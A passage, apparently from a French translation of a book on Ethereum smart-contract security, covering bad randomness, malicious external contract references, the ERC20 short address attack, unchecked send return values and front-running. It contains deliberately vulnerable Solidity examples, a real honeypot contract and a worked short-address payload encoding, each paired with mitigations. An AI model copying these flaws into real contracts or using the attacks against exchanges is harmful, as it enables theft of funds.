<p>Toutes les transactions sur la chaîne de blocs Ethereum sont des opérations de transition d&#8217;état déterministes. Cela signifie que chaque transaction modifie l&#8217;état global de l' écosystème Ethereum de manière calculable, sans incertitude. Cela a pour implication fondamentale qu&#8217;il n&#8217;y a pas de source d&#8217;entropie ou d&#8217;aléatoire dans Ethereum. Atteindre une entropie décentralisée (aléatoire) est un problème bien connu pour lequel de nombreuses solutions ont été proposées, y compris <a href="https://github.com/randao/randao">RANDAO</a> , ou en utilisant une chaîne de hachages, comme décrit par Vitalik Buterin dans le billet de blog <a href="https://vitalik.ca/files/randomness.html">« Validator Ordering and Randomness in PoS »</a>.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_6">La vulnérabilité</h4>
<div class="paragraph">
<p>Certains des premiers contrats construits sur la plate-forme Ethereum étaient basés sur le jeu. Fondamentalement, le jeu nécessite de l&#8217;incertitude (quelque chose sur lequel parier), ce qui rend la construction d&#8217;un système de jeu sur la chaîne de blocs (un système déterministe) plutôt difficile. Il est clair que l' incertitude doit provenir d&#8217;une source extérieure à la chaîne de blocs. C&#8217;est possible pour les paris entre joueurs (voir par exemple la <a href="http://bit.ly/2CUh2KS">technique commit–reveal</a>); cependant, c&#8217;est beaucoup plus difficile si vous voulez mettre en place un contrat pour agir en tant que "croupier" (comme au blackjack ou à la roulette). Un écueil courant consiste à utiliser des variables de bloc futures, c&#8217;est-à-dire des variables contenant des informations sur le bloc de transaction dont les valeurs ne sont pas encore connues, telles que des hachages, des horodatages, des numéros de bloc ou des limites de gaz. Le problème avec ceux-ci est qu&#8217;ils sont contrôlés par le mineur qui exploite le bloc et, en tant que tels, ne sont pas vraiment aléatoires. Considérez, par exemple, un contrat intelligent de roulette avec une logique qui renvoie un nombre noir si le hachage du bloc suivant se termine par un nombre pair. Un mineur (ou pool de mineurs) pourrait parier 1 million de dollars sur le noir. S&#8217;ils résolvent le bloc suivant et trouvent que le hachage se termine par un nombre impair, ils pourraient heureusement ne pas publier leur bloc et en exploiter un autre, jusqu&#8217;à ce qu&#8217;ils trouvent une solution avec le hachage du bloc étant un nombre pair (en supposant que la récompense du bloc et les frais sont inférieurs à 1 M$). L&#8217;utilisation de variables passées ou présentes peut être encore plus dévastatrice, comme le démontre Martin Swende dans son excellent <a href="http://martin.swende.se/blog/Breaking_the_house.html">article de blog</a>. De plus, utiliser uniquement des variables de bloc signifie que le nombre pseudo-aléatoire sera le même pour toutes les transactions d&#8217;un bloc, de sorte qu&#8217;un attaquant peut multiplier ses gains en effectuant de nombreuses transactions dans un bloc (si il devait y avoir une mise maximale).</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_6">Techniques préventives</h4>
<div class="paragraph">
<p>La source d&#8217;entropie (aléatoire) doit être externe à la chaîne de blocs. Cela peut être fait entre pairs avec des systèmes tels que <a href="http://bit.ly/2CUh2KS">commit–reveal</a>, ou en changeant le modèle de confiance en un groupe de participants (comme dans <a href="https://github.com/randao/randao">RandDAO</a>). Cela peut également être fait via une entité centralisée qui agit comme un oracle aléatoire. Les variables de bloc (en général, il y a quelques exceptions) ne doivent pas être utilisées pour générer de l&#8217;entropie, car elles peuvent être manipulées par les mineurs.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_contrats_prng">Exemple concret : contrats PRNG</h4>
<div class="paragraph">
<p>En février 2018 Arseny Reutov <a href="http://bit.ly/2Q589lx">a blogué</a> sur son analyse de 3 649 contrats intelligents en direct qui utilisaient une sorte de générateur de nombres pseudo-aléatoires (PRNG) ; il a trouvé 43 contrats qui pourraient être exploités.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="external_contract_referencing">Référencement des contrats externes</h3>
<div class="paragraph">
<p>L&#8217;un des avantages de "l&#8217;ordinateur mondial" Ethereum est la possibilité de réutiliser du code et d&#8217;interagir avec des contrats déjà déployés sur le réseau. En conséquence, un grand nombre de contrats font référence à des contrats externes, généralement via des appels de messages externes. Ces appels de messages externes peuvent masquer les intentions des acteurs malveillants de certaines manières non évidentes, que nous allons maintenant examiner.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_7">La vulnérabilité</h4>
<div class="paragraph">
<p>Dans Solidity, n&#8217;importe quelle adresse peut être convertie en contrat, que le code à l&#8217;adresse représente ou non le type de contrat en cours de conversion. Cela peut causer des problèmes, en particulier lorsque l&#8217;auteur du contrat tente de dissimuler un code malveillant. Illustrons cela par un exemple.</p>
</div>
<div class="paragraph">
<p>Considérez un morceau de code comme <a href="#rot13_security">Rot13Encryption.sol</a>, qui implémente rudimentairement le <a href="https://en.wikipedia.org/wiki/ROT13">chiffrement ROT13</a> .</p>
</div>
<div id="rot13_security" class="exampleblock">
<div class="title">Example 8. Rot13Encryption.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">// contrat de chiffrement
contract Rot13Encryption {

   event Result(string convertedString);

    // rot13-chiffre une chaîne
    function rot13Encrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i &lt; length; i++) {
            byte char = bytes(text)[i];
            // assemblage en ligne pour modifier la chaîne
            assembly {
                // récupère le premier octet
                char := byte(0,char)
                // si le caractère est dans [ n,z ], c'est-à-dire l'enveloppant
                if and(gt(char,0x6D), lt(char,0x7B))
                // soustraire du nombre ASCII 'a',
                // la différence entre le caractère &lt;char&gt; et 'z'
                { char:= sub(0x60, sub(0x7A,char)) }
                if iszero(eq(char, 0x20)) // ignore espaces
                // ajoute 13 au caractère
                {mstore8(add(add(text,0x20), mul(i,1)), add(char,13))}
            }
        }
        emit Result(text);
    }

    // rot13-déchiffre une chaîne
    function rot13Decrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i &lt; length; i++) {
            byte char = bytes(text)[i];
            assembly {
                char := byte(0,char)
                if and(gt(char,0x60), lt(char,0x6E))
                { char:= add(0x7B, sub(char,0x61)) }
                if iszero(eq(char, 0x20))
                {mstore8(add(add(text,0x20), mul(i,1)), sub(char,13))}
            }
        }
        emit Result(text);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce code prend simplement une chaîne (lettres a à z, sans validation) et l'<em>encrypte</em> en décalant chaque caractère de 13 positions vers la droite (en s&#8217;enroulant autour de <code>z</code>); c&#8217;est-à-dire <code>a</code> passe à <code>n</code> et <code>x</code> passe à <code>k</code>. L&#8217;assemblage dans le contrat précédent n&#8217;a pas besoin d&#8217;être compris pour apprécier le problème discuté, de sorte que les lecteurs non familiarisés avec l&#8217;assemblage peuvent l&#8217;ignorer en toute sécurité.</p>
</div>
<div class="paragraph">
<p>Considérons maintenant le contrat suivant, qui utilise ce code pour son chiffrement :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">import "Rot13Encryption.sol";

// crypte vos informations top-secrètes
contract EncryptionContract {
    // bibliothèque pour le chiffrement
    Rot13Encryption encryptionLibrary;

    // constructeur - initialise la bibliothèque
    constructor(Rot13Encryption _encryptionLibrary) {
        encryptionLibrary = _encryptionLibrary;
    }

    function encryptPrivateData(string privateInfo) {
        // faire potentiellement quelques opérations ici
        encryptionLibrary.rot13Encrypt(privateInfo);
     }
 }</code></pre>
</div>
</div>
<div class="paragraph">
<p>Le problème avec ce contrat est que l&#8217;adresse de <code>encryptionLibrary</code> n&#8217;est pas publique ou constante. Ainsi, le déployeur du contrat pourrait donner une adresse dans le constructeur qui pointe vers ce contrat :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">// contrat de chiffrement
contract Rot26Encryption {

   event Result(string convertedString);

    // rot13-encrypte une chaîne
    function rot13Encrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i &lt; length; i++) {
            byte char = bytes(text)[i];
            // assemblage en ligne pour modifier la chaîne
            assembly {
                // récupère le premier octet
                char := byte(0,char)
                // si le caractère est dans [ n,z ], c'est-à-dire l'enveloppant
                if and(gt(char,0x6D), lt(char,0x7B))
                // soustraire du nombre ASCII 'a',
                // la différence entre le caractère &lt;char&gt; et 'z'
                { char:= sub(0x60, sub(0x7A,char)) }
                // ignore les espaces
                if iszero(eq(char, 0x20))
                // ajoute 26 au caractère !
                {mstore8(add(add(text,0x20), mul(i,1)), add(char,26))}
            }
        }
        emit Result(text);
    }

    // rot13-décrypte une chaîne
    function rot13Decrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i &lt; length; i++) {
            byte char = bytes(text)[i];
            assembly {
                char := byte(0,char)
                if and(gt(char,0x60), lt(char,0x6E))
                { char:= add(0x7B, sub(char,0x61)) }
                if iszero(eq(char, 0x20))
                {mstore8(add(add(text,0x20), mul(i,1)), sub(char,26))}
            }
        }
        emit Result(text);
    }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Ce contrat implémente le chiffrement ROT26, qui décale chaque caractère de 26 places (c&#8217;est-à-dire, ne fait rien). Encore une fois, il n&#8217;est pas nécessaire de comprendre l&#8217;assemblage dans ce contrat. Plus simplement, l&#8217;attaquant aurait pu lier le contrat suivant au même effet :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Print{
    event Print(string text);

    function rot13Encrypt(string text) public {
        emit Print(text);
    }
 }</code></pre>
</div>
</div>
<div class="paragraph">
<p>Si l&#8217;adresse de l&#8217;un de ces contrats était donnée dans le constructeur, la fonction <code>encryptPrivateData</code> produirait simplement un événement qui imprime les données privées non chiffrées.</p>
</div>
<div class="paragraph">
<p>Bien que dans cet exemple, un contrat de type bibliothèque ait été défini dans le constructeur, il arrive souvent qu&#8217;un utilisateur privilégié (tel qu&#8217;un propriétaire) puisse modifier les adresses de contrat de bibliothèque. Si un contrat lié ne contient pas la fonction appelée, la fonction de secours s&#8217;exécutera. Par exemple, avec la ligne <code>encryptionLibrary.rot13&#x200b;Encrypt()</code>, si le contrat spécifié par <code>encryptionLibrary</code> était :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity"> contract Blank {
     event Print(string text);
     function () {
         emit Print("Here");
         // placez le code malveillant ici et il s'exécutera
     }
 }</code></pre>
</div>
</div>
<div class="paragraph">
<p>alors un événement avec le texte <code>Here</code> serait émis. Ainsi, si les utilisateurs peuvent modifier les bibliothèques de contrats, ils peuvent en principe amener d&#8217;autres utilisateurs à exécuter du code arbitraire sans le savoir.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<div class="title">Warning</div>
</td>
<td class="content">
<div class="paragraph">
<p>Les contrats représentés ici sont uniquement à des fins de démonstration et ne représentent pas un cryptage approprié. Ils ne devrait pas être utilisé pour le cryptage .</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_7">Techniques préventives</h4>
<div class="paragraph">
<p>Comme démontré précédemment, les contrats sûrs peuvent (dans certains cas) être déployés de telle manière qu&#8217;ils se comportent de manière malveillante. Un auditeur pourrait vérifier publiquement un contrat et demander à son propriétaire de le déployer de manière malveillante, ce qui entraînerait un contrat audité publiquement présentant des vulnérabilités ou une intention malveillante.</p>
</div>
<div class="paragraph">
<p>Il existe un certain nombre de techniques qui empêchent ces scénarios.</p>
</div>
<div class="paragraph">
<p>Une technique consiste à utiliser le mot-clé <code>new</code> pour créer des contrats. Dans l&#8217;exemple précédent, le constructeur pourrait s&#8217;écrire :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">constructor() {
    encryptionLibrary = new Rot13Encryption();
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>de cette manière, une instance du contrat référencé est créée au moment du déploiement et le déployeur ne peut pas remplacer le contrat <code>Rot13Encryption</code> sans le modifier.</p>
</div>
<div class="paragraph">
<p>Une autre solution consiste à coder en dur les adresses de contrat externes.</p>
</div>
<div class="paragraph">
<p>En général, le code qui appelle des contrats externes doit toujours être audité avec soin. En tant que développeur, lors de la définition de contrats externes, il peut être judicieux de rendre publiques les adresses des contrats (ce qui n&#8217;est pas le cas dans l&#8217;exemple du pot de miel de la section suivante) pour permettre aux utilisateurs d&#8217;examiner facilement le code référencé par le contrat. Inversement, si un contrat a une adresse de contrat en variable privée, cela peut être le signe d&#8217;un comportement malveillant (comme le montre l&#8217;exemple du monde réel). Si un utilisateur peut modifier une adresse de contrat utilisée pour appeler des fonctions externes, il peut être important (dans un contexte de système décentralisé) d&#8217;implémenter un mécanisme de verrouillage du temps et/ou de vote pour permettre aux utilisateurs de voir quel code est modifié, ou pour donner aux participants la possibilité de s&#8217;inscrire ou s&#8217;abstenir avec la nouvelle adresse contractuelle.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_pot_de_miel_de_réentrance">Exemple concret : pot de miel de réentrance</h4>
<div class="paragraph">
<p>Un certain nombre de pots de miel récents ont été publiés sur le réseau principal. Ces contrats tentent de déjouer les pirates Ethereum qui tentent d&#8217;exploiter les contrats, mais qui finissent par perdre de l&#8217;ether au profit du contrat qu&#8217;ils s&#8217;attendent à exploiter. Un exemple utilise cette attaque en remplaçant un contrat attendu par un contrat malveillant dans le constructeur. Le code se trouve <a href="http://bit.ly/2JtdqRi">ici</a> :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">pragma solidity ^0.4.19;

contract Private_Bank
{
    mapping (address =&gt; uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;

    function Private_Bank(address _log)
    {
        TransferLog = Log(_log);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value &gt;= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _am)
    {
        if(_am&lt;=balances[msg.sender])
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }

    function() external payable{}

}

contract Log
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;
    Message LastMsg;

    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Ce <a href="http://bit.ly/2Q58VyX">message</a> d&#8217;un utilisateur de reddit explique comment il a perdu 1 ether à cause de ce contrat en essayant d&#8217;exploiter le bogue de réentrance qu&#8217;il s&#8217;attendait à trouver dans le contrat..</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_attaque_par_adresse_courteparamètre">Attaque par adresse courte/paramètre</h3>
<div class="paragraph">
<p>Cette attaque n&#8217;est pas effectuée sur les contrats Solidity eux-mêmes, mais sur des applications tierces susceptibles d&#8217;interagir avec eux. Cette section est ajoutée par souci d&#8217;exhaustivité et pour donner au lecteur une idée de la façon dont les paramètres peuvent être manipulés dans les contrats.</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus, consultez <a href="http://bit.ly/2yKme14">« The ERC20 Short Address Attack Explained »</a> , <a href="http://bit.ly/2yFOGRQ">« ICO Smart Contract Vulnerability : Short Address Attack »</a> , ou ce <a href="http://bit.ly/2CQjBhc">post Reddit</a> .</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_8">La vulnérabilité</h4>
<div class="paragraph">
<p>Lors de la transmission de paramètres à un contrat intelligent, les paramètres sont codés conformément à la <a href="http://bit.ly/2Q5VIG9">spécification ABI</a> . Il est possible d&#8217;envoyer des paramètres codés plus courts que la longueur de paramètre attendue (par exemple, envoyer une adresse qui ne contient que 38 caractères hexadécimaux (19 octets) au lieu des 40 caractères hexadécimaux standard (20 octets)). Dans un tel scénario, l&#8217;EVM ajoutera des zéros à la fin des paramètres codés pour compenser la longueur attendue.</p>
</div>
<div class="paragraph">
<p>Cela devient un problème lorsque les applications tierces ne valident pas les entrées. L&#8217;exemple le plus clair est un échange qui ne vérifie pas l&#8217;adresse d&#8217;un jeton ERC20 lorsqu&#8217;un utilisateur demande un retrait. Cet exemple est traité plus en détail dans l&#8217;article de Peter Vessenes , <a href="http://bit.ly/2Q1ybpQ">"The ERC20 Short Address Attack Explained"</a> .</p>
</div>
<div class="paragraph">
<p>Considérez l&#8217;interface de fonction de transfert standard <a href="http://bit.ly/2CUf7WG">ERC20</a> , en notant l&#8217;ordre des paramètres :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">function transfer(address to, uint tokens) public returns (bool success);</code></pre>
</div>
</div>
<div class="paragraph">
<p>Considérons maintenant un échange détenant une grande quantité d&#8217;un jeton (disons <code>REP</code>) et un utilisateur qui souhaite retirer sa part de 100 jetons. L&#8217;utilisateur soumettrait son adresse, <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead</code> , et le nombre de jetons, <code>100</code>. L&#8217;échange coderait ces paramètres dans l&#8217;ordre spécifié par la fonction <code><span class="keep-together">transfer</span></code>; c&#8217;est-à-dire <code>address</code> puis <code>tokens</code> . Le résultat encodé serait :</p>
</div>
<div class="listingblock">
<div class="content">
<pre>a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeaddead0000000000000
000000000000000000000000000000000056bc75e2d63100000</pre>
</div>
</div>
<div class="paragraph">
<p>Les 4 premiers octets ( <code>a9059cbb</code> ) sont <a href="http://bit.ly/2RmueMP">la signature ou le sélecteur de fonction</a> de <code>transfer</code>, les 32 octets suivants sont l&#8217;adresse et les 32 derniers octets représentent le nombre <code>uint256</code> de jetons. Notez que l&#8217;hex <code>56bc75e2d63100000</code> à la fin correspond à 100 jetons (avec 18 décimales, comme spécifié par le contrat de jeton REP ).</p>
</div>
<div class="paragraph">
<p>Voyons maintenant ce qui se passerait si l&#8217;on envoyait une adresse à laquelle il manquait 1 octet (2 chiffres hexadécimaux). Plus précisément, disons qu&#8217;un attaquant envoie <code>0xdeaddeaddeaddeaddeaddeaddeaddeadde</code> comme adresse (il manque les deux derniers chiffres) et les mêmes 100 jetons à retirer. Si l&#8217;échange ne valide pas cette entrée, elle sera encodée comme :</p>
</div>
<div class="listingblock">
<div class="content">
<pre>a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeadde00000000000000
00000000000000000000000000000000056bc75e2d6310000000</pre>
</div>
</div>
<div class="paragraph">
<p>La différence est subtile. Notez que <code>00</code> a été ajouté à la fin de l&#8217;encodage, pour compenser l&#8217;adresse courte qui a été envoyée. Lorsque cela est envoyé au contrat intelligent, les paramètres de <code>address</code> seront lus comme <code>0xdeaddeaddeaddeaddeaddeaddeaddeadde00</code> et la valeur sera lue comme <code>56bc75e2d6310000000</code> (notez les deux 0 supplémentaires). Cette valeur est maintenant de <code>25600</code> jetons (la valeur a été multipliée par <code>256</code>). Dans cet exemple, si l&#8217;échange contenait autant de jetons, l&#8217;utilisateur retirerait <code>25600</code> jetons (alors que l&#8217;échange pense que l&#8217;utilisateur n&#8217;en retire que <code>100</code>) à l&#8217;adresse modifiée. Évidemment , l&#8217;attaquant ne possédera pas l&#8217;adresse modifiée dans cet exemple, mais si l&#8217;attaquant devait générer une adresse qui se terminait par des 0 (qui peut être facilement forcée brutalement) et utilisait cette adresse générée, il pourrait voler des jetons à l&#8217;échange sans méfiance.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_8">Techniques préventives</h4>
<div class="paragraph">
<p>Tous les paramètres d&#8217;entrée dans les applications externes doivent être validés avant de les envoyer à la chaîne de blocs. Il convient également de noter que l&#8217;ordre des paramètres joue ici un rôle important. Comme le rembourrage ne se produit qu&#8217;à la fin, un ordre minutieux des paramètres dans le contrat intelligent peut atténuer certaines formes de cette attaque.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_valeurs_de_retour_call_non_vérifiés">Valeurs de retour CALL non vérifiés</h3>
<div class="paragraph">
<p>Il existe plusieurs façons d&#8217;effectuer des appels externes dans Solidity. L&#8217;envoi d&#8217;ether à des comptes externes est généralement effectué via la méthode <code>transfer</code> . Cependant, la fonction d&#8217;envoi <code>send</code> peut également être utilisée, et pour des appels externes plus polyvalents, l' opcode <code>CALL</code> peut être directement utilisé dans Solidity. Les fonctions d&#8217;appel <code>call</code> et d&#8217;envoi <code>send</code> renvoient un booléen indiquant si l&#8217;appel a réussi ou échoué. Ainsi, ces fonctions ont une simple mise en garde, en ce sens que la transaction qui exécute ces fonctions ne reviendra pas si l&#8217;appel externe ( initialisé par <code>call</code> ou <code>send</code> ) échoue; à la place, les fonctions renverront simplement <code>false</code>. Une erreur courante est que le développeur s&#8217;attend à ce qu&#8217;un retour se produise si l&#8217;appel externe échoue et ne vérifie pas la valeur de retour.</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus, consultez le numéro 4 du <a href="http://www.dasp.co/#item-4">Top 10 DASP de 2018</a> et <a href="http://bit.ly/2RnS1vA">"Scanning Live Ethereum Contracts for the 'Unchecked-Send' Bug"</a>.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_9">La vulnérabilité</h4>
<div class="paragraph">
<p>Considérez l&#8217;exemple suivant :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Lotto {

    bool public payedOut = false;
    address public winner;
    uint public winAmount;

    // ... fonctionnalité supplémentaire ici

    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(this.balance);
    }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Cela représente un contrat de type Lotto, où un gagnant <code>winner</code> reçoit une quantité d&#8217;ether (<code>winAmount</code>), ce qui laisse généralement un peu de reste à retirer.</p>
</div>
<div class="paragraph">
<p>La vulnérabilité existe sur la ligne 11, où un envoi <code>send</code> est utilisé sans vérifier la réponse. Dans cet exemple trivial, un gagnant <code>winner</code> dont la transaction échoue (soit parce qu&#8217;il est à court d&#8217;essence, soit parce qu&#8217;il s&#8217;agit d&#8217;un contrat qui lance intentionnellement la fonction de secours) permet à <code>payedOut</code> d&#8217;être défini sur <code>true</code>, que l&#8217;ether ait été envoyé ou non. Dans ce cas, n&#8217;importe qui peut retirer les gains du gagnant <code>winner</code> via la fonction <code>withdrawLeftOver</code>.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_9">Techniques préventives</h4>
<div class="paragraph">
<p>Dans la mesure du possible, utilisez la fonction <code>transfer</code> plutôt que <code>send</code>, car le transfert sera annulé si la transaction externe est annulée. Si un envoi <code>send</code> est requis, vérifiez toujours la valeur de retour.</p>
</div>
<div class="paragraph">
<p>Une <a href="http://bit.ly/2CSdF7y">recommandation</a> plus robuste est d&#8217;adopter un <em>modèle de retrait</em> . Dans cette solution, chaque utilisateur doit appeler une fonction de retrait isolée qui gère l&#8217;envoi d&#8217;ether hors du contrat et traite les conséquences des transactions d&#8217;envoi échouées. L&#8217;idée est d&#8217;isoler logiquement la fonctionnalité d&#8217;envoi externe du reste de la base de code et de placer le fardeau d&#8217;une transaction potentiellement échouée sur l&#8217;utilisateur final appelant la fonction de retrait.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_etherpot_et_king_of_the_ether">Exemple concret : Etherpot et King of the Ether</h4>
<div class="paragraph">
<p><a href="http://bit.ly/2OfHalK">Etherpot</a> était une loterie de contrats intelligents, pas trop différente de l&#8217;exemple de contrat mentionné précédemment. La chute de ce contrat était principalement due à une utilisation incorrecte des hachages de bloc (seuls les 256 derniers hachages de bloc sont utilisables ; voir le <a href="http://bit.ly/2Jpzf4x">post d&#8217;Aakil Fernandes</a> sur la manière dont Etherpot n&#8217;a pas réussi à en tenir compte correctement). Cependant, ce contrat a également souffert d&#8217;une valeur d&#8217;appel non contrôlée. Considérez la fonction <code>cash</code> dans <a href="#lotto_security">lotto.sol: Code snippet</a>.</p>
</div>
<div id="lotto_security" class="exampleblock">
<div class="title">Example 9. lotto.sol: Code snippet</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">...
  function cash(uint roundIndex, uint subpotIndex){

        var subpotsCount = getSubpotsCount(roundIndex);

        if(subpotIndex&gt;=subpotsCount)
            return;

        var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);

        if(decisionBlockNumber&gt;block.number)
            return;

        if(rounds[roundIndex].isCashed[subpotIndex])
            return;
        // Les sous-cagnottes ne peuvent être encaissés qu'une seule fois. C'est pour éviter les doubles paiements
        var winner = calculateWinner(roundIndex,subpotIndex);
        var subpot = getSubpot(roundIndex);

        winner.send(subpot);

        rounds[roundIndex].isCashed[subpotIndex] = true;
        // Marquer le tour comme encaissé
}
...</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Notez qu&#8217;à la ligne 21, la valeur de retour de la fonction <code>send</code> n&#8217;est pas vérifiée, et la ligne suivante définit alors un booléen indiquant que le gagnant a reçu ses fonds. Ce bogue peut autoriser un état où le gagnant ne reçoit pas son ether, mais l&#8217;état du contrat peut indiquer que le gagnant a déjà été payé.</p>
</div>
<div class="paragraph">
<p>Une version plus sérieuse de ce bogue s&#8217;est produite dans le <a href="http://bit.ly/2ACsfi1">King of the Ether</a>. Un excellent <a href="http://bit.ly/2ESoaub">post-mortem</a> de ce contrat a été écrit qui détaille comment un envoi échoué non contrôlé pourrait être utilisé pour attaquer le <span class="keep-together">contrat</span>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="frontrunning_security">Conditions de course/devancement</h3>
<div class="paragraph">
<p>La combinaison d&#8217;appels externes à d&#8217;autres contrats et la nature multi-utilisateurs de la chaîne de blocs sous-jacente donnent lieu à une variété de pièges potentiels de Solidity dans lesquels les utilisateurs font la <em>course</em> à l&#8217;exécution du code pour obtenir des états inattendus. La réentrance (discutée plus haut dans ce chapitre) est un exemple d&#8217;une telle condition de concurrence. Dans cette section, nous discuterons d&#8217;autres types de conditions de concurrence pouvant survenir sur la chaîne de blocs Ethereum. Il existe une variété de bons articles sur ce sujet, y compris "Race Conditions" sur le <a href="http://bit.ly/2yFesFF">Wiki Ethereum</a> , <a href="http://www.dasp.co/#item-7">#7 sur le DASP Top10 de 2018</a> , et les <a href="http://bit.ly/2Q6E4lP">meilleures pratiques pour les contrats intelligents Ethereum</a> .</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_10">La vulnérabilité</h4>
<div class="paragraph">
<p>Comme avec la plupart des chaînes de blocs, les nœuds Ethereum regroupent les transactions et les forment en blocs. Les transactions ne sont considérées comme valides qu&#8217;une fois qu&#8217;un mineur a résolu un mécanisme de consensus (actuellement <a href="http://bit.ly/2yI5Dv7">Ethash</a> PoW (preuve de travail) pour Ethereum). Le mineur qui résout le bloc choisit également les transactions du bassin qui seront incluses dans le bloc, généralement classées par le <code>gasPrice</code> de chaque transaction. Voici un vecteur d&#8217;attaque potentiel. Un attaquant peut surveiller le bassin de transactions à la recherche de transactions susceptibles de contenir des solutions à des problèmes, et modifier ou révoquer les autorisations du solveur ou changer l&#8217;état d&#8217;un contrat au détriment du solveur. L&#8217;attaquant peut alors obtenir les données de cette transaction et créer sa propre transaction avec un <code>gasPrice</code> plus élevé afin que sa transaction soit incluse dans un bloc avant l&#8217;original.</p>
</div>
<div class="paragraph">
<p>Voyons comment cela pourrait fonctionner avec un exemple simple. Considérez le contrat affiché dans <a href="#findthishash_security">FindThisHash.sol</a>.</p>
</div>
<div id="findthishash_security" class="exampleblock">
<div class="title">Example 10. FindThisHash.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract FindThisHash {
    bytes32 constant public hash =
      0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;

    constructor() external payable {} // charge de l'ether

    function solve(string solution) public {
        // Si vous pouvez trouver la pré-image du hachage, recevez 1000 ether
        require(hash == sha3(solution));
        msg.sender.transfer(1000 ether);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Supposons que ce contrat contienne 1 000 ether . L&#8217;utilisateur qui peut trouver la préimage du hachage SHA-3 suivant :</p>
</div>
<div class="listingblock">
<div class="content">
<pre>0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a</pre>
</div>
</div>
<div class="paragraph">
<p>peut soumettre la solution et récupérer les 1 000 ethers . Disons qu&#8217;un utilisateur découvre que la solution est <code>Ethereum!</code>. Ils appellent <code>resolve</code> (résoudre) avec <code>Ethereum!</code> comme paramètre. Malheureusement, un attaquant a été assez intelligent pour surveiller le bassin de transactions pour toute personne soumettant une solution. Ils voient cette solution, vérifient sa validité, puis soumettent une transaction équivalente avec un <code>gasPrice</code> beaucoup plus élevé que la transaction d&#8217;origine. Le mineur qui résout le bloc donnera probablement la préférence à l&#8217;attaquant en raison du <code>gasPrice</code> plus élevé et exploitera sa transaction avant celle du solveur d&#8217;origine. L&#8217;attaquant prendra les 1 000 ethers et l&#8217;utilisateur qui a résolu le problème n&#8217;obtiendra rien. Gardez à l&#8217;esprit que dans ce type de vulnérabilité de "devancement", les mineurs sont particulièrement incités à exécuter les attaques eux-mêmes (ou peuvent être soudoyés pour exécuter ces attaques avec des frais extravagants). La possibilité que l&#8217;attaquant soit lui-même un mineur ne doit pas être sous-estimée.</p>
</div>
</div>
<div class="sect3 notoc">
